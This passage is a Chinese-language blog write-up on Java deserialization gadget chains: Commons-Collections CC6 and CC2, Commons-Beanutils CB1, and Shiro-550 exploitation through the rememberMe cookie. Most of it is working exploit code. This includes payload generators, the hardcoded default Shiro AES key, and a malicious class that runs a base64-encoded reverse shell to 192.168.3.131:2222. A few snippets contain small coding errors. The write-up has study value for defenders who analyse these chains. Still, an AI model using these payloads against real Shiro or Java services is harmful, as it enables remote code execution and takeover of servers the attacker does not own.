            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(
                new Class[] { Templates.class },
                new Object[] { obj }
            )
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        innerMap.put("value", "xxxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = cls.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
        setFieldValue(transformerChain, "iTransformers", transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }


    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```





## CCK1(Shiro-550)

p牛给出了一个[小demo](https://github.com/phith0n/JavaThings/tree/master/shirodemo)，只有两个jsp，依赖有这些

- shiro-core、shiro-web，这是shiro本身的依赖
- javax.servlet-api、jsp-api，这是JSP和Servlet的依赖，仅在编译阶段使用，因为Tomcat中自带这两个依赖
- slf4j-api、slf4j-simple，这是为了显示shiro中的报错信息添加的依赖
- commons-logging，这是shiro中用到的一个接口，不添加会爆java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory错误
- commons-collections，为了演示反序列化漏洞，增加了commons-collections依赖，版本为3.2.1

打war包后部署在本地

![image-20220301201435981](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301201435981.png)

抓包可以看到，不勾选`Remember Me`时cookie有rememberMe=deleteMe，勾选的话则是

![image-20220301202246982](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301202246982.png)

这里的b64加密信息是AES，在`org.apache.shiro.mgt.AbstractRememberMeManager`中可以看到默认key

![image-20220301232709437](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301232709437.png)

![image-20220301232313280](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301232313280.png)

可以看到它在同名的构造函数中设置了这个default key，而控制cookie信息`org.apache.shiro.web.mgt.CookieRememberMeManager`继承了这个类

由于它使用了默认key并且用了cc依赖，我们的攻击过程是这样的：

- 用CC链生成payload
- 用Shiro默认key进行加密
- 将密文作为rememberMe的Cookie发送给服务端

### CC6为什么不行

p牛写了一个基于CC6的exp

```java
package com.govuln.shiroattack;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class Client0 {
    public static void main(String []args) throws Exception {
        byte[] payloads = new CommonsCollections6().getPayload("whoami");
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
```

```java
package com.govuln.shiroattack;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


public class CommonsCollections6 {
    public byte[] getPayload(String command) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] { command }),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");

        outerMap.remove("keykey");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        return barr.toByteArray();
    }
}
```

将生成结果发送，但是console疯狂报错

![image-20220301212540550](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301212540550.png)

看到这个`org.apache.shiro.io.ClassResolvingObjectInputStream`，它重写了`resolveClass`方法

```java
public class ClassResolvingObjectInputStream extends ObjectInputStream {
    public ClassResolvingObjectInputStream(InputStream inputStream) throws IOException {
        super(inputStream);
    }

    protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {
        try {
            return ClassUtils.forName(osc.getName());
        } catch (UnknownClassException var3) {
            throw new ClassNotFoundException("Unable to load ObjectStreamClass [" + osc + "]: ", var3);
        }
    }
}
```

这是反序列化中用来查找类的方法，它重写了`ObjectInputStream`

```java
protected Class<?> resolveClass(ObjectStreamClass desc)
    throws IOException, ClassNotFoundException
{
    String name = desc.getName();
    try {
        return Class.forName(name, false, latestUserDefinedLoader());
    } catch (ClassNotFoundException ex) {
        Class<?> cl = primClasses.get(name);
        if (cl != null) {
            return cl;
        } else {
            throw ex;
        }
    }
}
```

注意到前者用的是`org.apache.shiro.util.ClassUtils#forName`（内部是`org.apache.catalina.loader.ParallelwebappClassLoader#loadClass`），而父类用的是`Class.forName`

我们在上面的位置打断点调试一下；注意如果断不下来，可以考虑往前找一找调用关系，比如org.apache.shiro.mgt.AbstractRememberMeManager#decrypt，它执行cookie部分的解码，中间触发反序列化

`resolveClass`依次得到我们链子中的LazyMap等等 都很正常，问题出在突然出现的`[Lorg.apache.commons.collections.Transformer;`

![image-20220302012117925](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302012117925.png)

`clazz==null`，抛出异常，但并不是因它是`[L`标记的数组这一点导致报错，因为在它后面还有`fqcn="[Ljava.lang.Object;"`

![image-20220302013221745](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302013221745.png)

它就没有返回null，后面还有好几个都带`[L`标记的对象，都没有返回null，这样的猜测显然是错误的

重新发包并继续断在`loadClass`

![image-20220302014123306](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302014123306.png)

我们注意到这里使用的`ClassLoader`是上面的`ParallelWebappClassLoader`，而它的工作模式就是这里的bug之处

![img](https://images2015.cnblogs.com/blog/722072/201706/722072-20170623200651991-1212784795.png)

java装载类时遵循“全盘负责委托机制”，“全盘负责”指的是当一个ClassLoader装载一个类时，除非显示地使用另外一个ClassLoder，否则该类所依赖及引用的类也由这个ClassLoder载入；“委托机制”指先委托父类装载器寻找目标类，只有在找不到的情况下才从自己的类路径中查找并装载目标类，对应到这里，当它找不到时就会用上面的`URLClassLoader`

（特别注意的是，`WeappClassLoader`默认不适用委托机制

正常的class解析后path是最前面加`/`，`.`换为`/`，

![image-20220302015732344](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302015732344.png)

之后这个值会传入hashMap作为key，我们直接在key的地方断，发现Transformer数组传入稍有点特殊（数组都这样

![image-20220302020435664](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020435664.png)

问题是它在前一步调用的是上层的`URLClassLoader`！

![image-20220302020339145](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020339145.png)

对照其它带`[L`的对象

![image-20220302020711367](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020711367.png)

![image-20220302020959932](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020959932.png)

![image-20220302021055809](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302021055809.png)

被正常解析

经过上面的调试我们可以得出结论：当反序列化流中出现非java自身的数组，会引起`ParallelWebappClassLoader`触发双亲委托机制，将对象交给上层的`URLClassLoader`进行处理，由于参数的不匹配，自然就出现无法加载类的错误

### 搞个行的

既然问题出在非java原生的Transformer数组上，我们把它换为`TiedMapEntry`，构造函数接收两个参数 Map和Key，它有一个`getValue`方法

```java
public Object getValue(){
	return map.get(key);
}
```

当我们出传入的map是LazyMap时，这个get就可以触发transform的回调了

```java
public Object get(Object key){
	if(map.containsKey(key) == false){
		Object value = factory.transform(key);
		map.put(key, value);
		return value;
	}
	return map.get(key);
}
```

前面用到`get`时我们并不关心传入的key，因为重点在Transformer数组的ConstantTransformer，我们通过它来初始化恶意对象

而仔细看这里的key会被传入`transform`，它可以扮演ConstantTransformer的角色

再回看Transformer数组

```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(obj),
    new InvokerTransformer("newTransformer",
        null,
        null
    )
};
```

第二行可以去掉，数组长度变为1，数组也不需要了

编写一下exp

```java
package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


public class testCC6Shiro {
    public byte[] getPayload(byte[] clsBytes)throws Exception{
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clsBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("getClass", null, null);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);
        TiedMapEntry tme = new TiedMapEntry(outerMap, obj);
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.clear();	// 同outerMap.clear()
        setFieldValue(transformer, "iMethodName", "newTransformer");

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        return barr.toByteArray();
    };

    public static void setFieldValue(Object obj, String fieldName, Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    };
}
```

恶意类

```java
package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class testCC6ShiroEvil {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public Evil() throws Exception {
        super();
        System.out.println("Hello TemplatesImpl");
        Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ==}|{base64,-d}|{bash,-i}");
    }
}
```

通过Client.java装配CC6Shiro

```java
package ysoserial.payloads;

import javassist.ClassPool;
import javassist.CtClass;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class testCC6ShiroClient {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass cls = pool.get(ysoserial.payloads.testCC6ShiroEvil.class.getName());
        byte[] payload = new testCC6Shiro().getPayload(cls.toBytecode());

        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
```

由于我在Linux上测试，就不弹计算器，直接弹shell

![image-20220302030308598](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302030308598.png)

效果拔群！！！！！！

这一节我们将`TemplatesImpl`和CC6结合在一起，同时解决了CC3高版本利用不了的问题

## CC2 - cc4

CC反序列化利用链被提出时，cc依赖有以下两个版本，groupId和artifactId都不一样

- commons-collections:commons-collections
- org.apache.commons:commons-collection4

表现在我们构造exp的区别是将`decorate`改为了`LazyMap`

```java
public static Map decorate(Map map, Transformer factory){
	return new LazyMap(map, factory);
}
```

```java
public static <V, K> LazyMap<K, V> LazyMap(final Map<K, V> map, final Transformer<? super K, ? extends V> factory){
	return new LazyMap<K, V>(map, factory);
}
```

直接把gadget改一下名字即可；不过为了专门适配cc4，ysoserial也有专门的链子CC2和CC4

cc包之所以能找出这么多链子，除了相当基础以外，更多的原因在于它包含了很多可以执行任意方法的Transformer，所以找链子的过程相当于找一条从`Serializable#readObject`到`Transformer#transform`方法的调用链

我们分析一下CC2，它用到的关键类有`java.util.PriorityQueue`和`org.apache.commons.collections4.comparators.TransformingComparator`（可通过comprare调用transform）

`java.util.PriorityQueue`重写了`readObject`方法

```java
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
    s.defaultReadObject();
    // Read in (and discard) array length
    s.readInt();
    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
    queue = new Object[size];
    // Read in all elements.
    for (int i = 0; i < size; i++)
        queue[i] = s.readObject();
    // Elements are guaranteed to be in "proper order", but the
    // spec has never explained what that might be.
    heapify();
}
```

```
heapify-> siftDown-> siftDownUsingComparator-> comparator.compare-> TransformingComparator-> compare-> transform
```

构造poc

```java
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;


public class CC2 {
    public static void main(String[] args) throws Exception{
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object.class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new String[]{"calc.exe"}
                ),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Comparator comparator = new TransformingComparator(transformerChain);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);

        setFieldValue(transformerChain, "iTransformers", transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

### TemplatesImpl

把exp改造为TemplatesImpl的无transformer数组版

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsCollections2TemplatesImpl {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    protected static byte[] getBytescode() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(evil.EvilTemplatesImpl.class.getName());
        return clazz.toBytecode();
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{getBytescode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("toString", null, null);
        Comparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(obj);
        queue.add(obj);

        setFieldValue(transformer, "iMethodName", "newTransformer");

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

### 修复

这条CC2是cc4限定，因为`org.apache.commons.collections4.comparators.TransformingComparator`在之前版本是没有`Serializable`接口的，无法在序列化中使用

在cc3.2.2版中通过添加`FunctorUtils#checkUnsafeSerialization`来检测反序列化是否安全，如果没有设置`org.apache.commons.collections.enableUnsafeSerialization=true`，会抛出异常

这个检查在常见的危险Transformer类（Instantiate, Invoker, Prototype, CloneTransformer）里的readObject调用

在cc4.1版中，这几个类没有Serializable接口，彻底无法序列化了

## CB1

Commons Beanutils，顾名思义封装了对java bean的一些操作方法，比如可以直接调用java bean的getter方法

```java
PropertyUtils.getProperty(new Cat(), "name");
```

这里会自动找到name属性的方法，即getName，除此之外这个方法还支持递归获取属性

在上面的CC2中我们使用了PriorityQueue，在它的排序中涉及到Comparator接口的compare方法，最后触发transform，在CB中也存在一个可利用的Comparator对象，BeanComparator

```java
public int compare(T o1, T o2) {
    if (this.property == null) {
        return this.internalCompare(o1, o2);
    } else {
        try {
            Object value1 = PropertyUtils.getProperty(o1, this.property);
            Object value2 = PropertyUtils.getProperty(o2, this.property);
            return this.internalCompare(value1, value2);
        } catch (IllegalAccessException var5) {
            throw new RuntimeException("IllegalAccessException: " + var5.toString());
        } catch (InvocationTargetException var6) {
            throw new RuntimeException("InvocationTargetException: " + var6.toString());
        } catch (NoSuchMethodException var7) {
            throw new RuntimeException("NoSuchMethodException: " + var7.toString());
        }
    }
}
```

传入两个对象，如果property为空则直接比较对象，否则用getProperty取出属性比较，调用对象的getter

回想当时TemplatesImpl的调用链

```
TemplateImpl#getOutputProperties	public
-> TemplateImpl#newTransformer		public
-> TemplateImpl#getTransletInstance
-> TemplateImpl#defineTransletClasses
-> TemplateImpl#defineClass			default
```

注意到`getOutputProperties`，是触发后面的关键

```java
public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties();
    }catch (TransformerConfigurationException e) {
        return null;
    }
}
```

它就是一个getter！跟前面的结合起来

```java
PropertyUtils.getProperty(o1, "outputProperties");
```

当o1为TemplatesImpl对象时，就会调用getOutputProperties

构造链子

```java
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;

public class CommonsBeanutils1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()
        });
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

### Shiro-550(无cc

shiro本身的依赖是有cb的，但是会因为serialVersionUID不符而报错，即使我们调对生成payload的本地依赖版本和目标环境一致也会出现cc依赖版本不对的情况，我们设想一条无依赖的Shiro反序列化利用链

在BeanComparator的构造函数处，没有显式传入Comparator时默认使用cc中的ComparableComparator，替代类需要满足这样的条件：

- 实现java.util.Comparator接口
- 实现java.io.Serializable接口
- 最好自带，兼容性强

我们找到了java.util.String中的内部私有类CaseInsesitiveComparator，它实现了Comparator和Serializable

替换exp

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsBeanutils1Shiro {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }
}

```

